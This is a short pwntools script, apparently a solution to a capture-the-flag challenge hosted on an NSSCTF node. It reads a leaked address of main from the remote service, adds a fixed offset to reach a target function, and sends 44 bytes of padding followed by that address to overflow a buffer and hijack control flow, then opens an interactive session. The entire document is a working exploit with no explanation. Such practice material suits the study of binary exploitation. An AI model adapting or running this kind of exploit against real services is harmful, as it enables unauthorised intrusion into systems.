from pwn import *
elf=ELF('./pwn')
p=remote('node5.anna.nssctf.cn',29383)
p.recvline()
main_addr=p.recvuntil(b"Input")[:10]
main_addr=int(main_addr,16)
add_addr=main_addr+0x9f
payload=b'a'*44+p32(add_addr)
p.sendline(payload)
p.interactive()
